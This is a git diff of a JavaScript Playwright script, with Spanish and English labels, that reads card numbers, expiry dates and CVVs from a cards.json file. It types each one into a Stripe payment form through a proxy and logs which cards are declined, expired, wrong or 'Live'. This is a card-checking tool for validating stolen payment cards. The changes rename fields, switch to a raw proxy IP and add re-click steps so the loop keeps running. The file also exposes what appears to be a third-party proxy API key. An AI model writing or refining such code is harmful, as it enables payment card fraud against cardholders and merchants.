@@ -229,7 +229,7 @@ PROXY_SERVER_PORT = '8001';
 //         let cards = JSON.parse(data);
 
 //         for(card in cards){
-//             console.log(card.cardnumber);
+//             console.log(card.card_number);
 //         }
 //     })
     
@@ -239,15 +239,15 @@ PROXY_SERVER_PORT = '8001';
 //     //     let cards = JSON.parse(data);
         
 //     //     cards.forEach((card) => {
-//     //         const tarjeta = card.cardnumber;
-//     //         const fecha = card.fecha;
+//     //         const tarjeta = card.card_number;
+//     //         const expiration_date = card.expiration_date;
 //     //         const cvv = card.cvv;
 
 //     //         const stripe = await pagePayment.$('#card-element')
 
 //     //         await stripe.click();
 //     //         await stripe.type(tarjeta, { delay: 50 });
-//     //         await stripe.type(fecha, { delay: 50 });
+//     //         await stripe.type(expiration_date, { delay: 50 });
 //     //         await stripe.type(cvv, { delay: 50 });
 //     //         await (await pagePayment.$('#card-element')).press('Enter');
         
@@ -271,15 +271,15 @@ PROXY_SERVER_PORT = '8001';
 //     //         let posicion4 = mensaje.indexOf(live);
         
 //     //         if(posicion !== -1){
-//     //             console.log("Card declined:"+ card.cardnumber+ "||"+ card.fecha+ "||"+ card.cvv);
+//     //             console.log("Card declined:"+ card.card_number+ "||"+ card.expiration_date+ "||"+ card.cvv);
 //     //         }else if(posicion2 !== -1){
-//     //             console.log("Numero incorrecto:"+ card.cardnumber+ "||"+ card.fecha+ "||"+ card.cvv);
+//     //             console.log("Numero incorrecto:"+ card.card_number+ "||"+ card.expiration_date+ "||"+ card.cvv);
 
 //     //         }else if(posicion3 !== -1){
-//     //             console.log("Tarjeta expirada:"+ card.cardnumber+ "||"+ card.fecha+ "||"+ card.cvv);
+//     //             console.log("Tarjeta expirada:"+ card.card_number+ "||"+ card.expiration_date+ "||"+ card.cvv);
 
 //     //         }else if(posicion4 !== -1){
-//     //             console.log("Liveeeee:"+ card.cardnumber+ "||"+ card.fecha+ "||"+ card.cvv);
+//     //             console.log("Liveeeee:"+ card.card_number+ "||"+ card.expiration_date+ "||"+ card.cvv);
 //     //         }
 //     //     });
 //     // });
@@ -300,11 +300,10 @@ fs.readFile('cards.json', (err, data) => {
             height: 900
         },
         proxy: {
-            server: 'l56ff.ep-proxy.net:33146',
-            username: 'ephemeral-proxies.p.rapidapi.com',
-            password: 'c725c0f033msh78d53d0038c9d96p1143fbjsna14fbfcf4b26'
+            server: '207.229.93.67:1025'
+            // username: 'ephemeral-proxies.p.rapidapi.com',
+            // password: 'c725c0f033msh78d53d0038c9d96p1143fbjsna14fbfcf4b26'
         },
-        params: {countries: 'PL'}
     });
 
     const context = await browser.newContext({ ignoreHTTPSErrors: true});
@@ -330,19 +329,17 @@ fs.readFile('cards.json', (err, data) => {
 
         const stripe = await pagePayment.$('#card-element', { timeout: 0 })
 
-        await pagePayment.waitForTimeout(10000);
+        await stripe.click ({ timeout: 0 });
 
-        await stripe.click ({ clickCount: 2 });
+        await pagePayment.waitForTimeout(8000);
 
-        await pagePayment.waitForTimeout(10000);
-
-        await stripe.type(`'${cards[card].cardnumber}'`, { delay: 70 });
-        await stripe.type(`'${cards[card].fecha}'`, { delay: 70 });
+        await stripe.type(`'${cards[card].card_number}'`, { delay: 70 });
+        await stripe.type(`'${cards[card].expiration_date}'`, { delay: 70 });
         await stripe.type(`'${cards[card].cvv}'`, { delay: 70 });
         // await stripe.type('33122', { delay: 70 });
         await (await pagePayment.$('#card-element')).press('Enter');
     
-        await pagePayment.waitForTimeout(10000);
+        await pagePayment.waitForTimeout(8000);
 
         const pageData = await pagePayment.evaluate(() => {
             return {
@@ -363,23 +360,35 @@ fs.readFile('cards.json', (err, data) => {
         let posicion5 = mensaje.indexOf(incorrectNumber);
     
         if(posicion !== -1){
-            console.log(`Card Declined: ${cards[card].cardnumber}||${cards[card].fecha}||${cards[card].cvv}\n`);
-            await pagePayment.waitForTimeout(10000);
+            console.log(`Card Declined: ${cards[card].card_number}||${cards[card].expiration_date}||${cards[card].cvv}\n`);
+            await pagePayment.waitForTimeout(8000);
+            const locator = pagePayment.locator('#card-element');
+            await locator.click();
+            
         }else if(posicion2 !== -1){
-            console.log(`CVV2 Incorrecto: ${cards[card].cardnumber}||${cards[card].fecha}||${cards[card].cvv}\n`);
-            await pagePayment.waitForTimeout(10000);
-
+            console.log(`CVV2 Incorrecto: ${cards[card].card_number}||${cards[card].expiration_date}||${cards[card].cvv}\n`);
+            await pagePayment.waitForTimeout(8000);
+            const locator = pagePayment.locator('#card-element');
+            await locator.click();
+            
         }else if(posicion3 !== -1){
-            console.log(`Tarjeta Expirada: ${cards[card].cardnumber}||${cards[card].fecha}||${cards[card].cvv}\n`);
-            await pagePayment.waitForTimeout(10000);
+            console.log(`Tarjeta Expirada: ${cards[card].card_number}||${cards[card].expiration_date}||${cards[card].cvv}\n`);
+            await pagePayment.waitForTimeout(8000);
+            const locator = pagePayment.locator('#card-element');
+            await locator.click();
+            
 
         }else if(posicion5 !== -1){
-            console.log(`Numero incorrecto: ${cards[card].cardnumber}||${cards[card].fecha}||${cards[card].cvv}\n`);
-            await pagePayment.waitForTimeout(10000);
+            console.log(`Numero incorrecto: ${cards[card].card_number}||${cards[card].expiration_date}||${cards[card].cvv}\n`);
+            await pagePayment.waitForTimeout(8000);
+            const locator = pagePayment.locator('#card-element');
+            await locator.click();
 
         }else if(posicion4 !== -1){
-            console.log(`Liveeee!: ${cards[card].cardnumber}||${cards[card].fecha}||${cards[card].cvv}\n`);
-            await pagePayment.waitForTimeout(10000);
+            console.log(`Liveeee!: ${cards[card].card_number}||${cards[card].expiration_date}||${cards[card].cvv}\n`);
+            await pagePayment.waitForTimeout(8000);
+            const locator = pagePayment.locator('#card-element');
+            await locator.click();
         }
     }
     await pagePayment.screenshot({ path: 'example.png' });
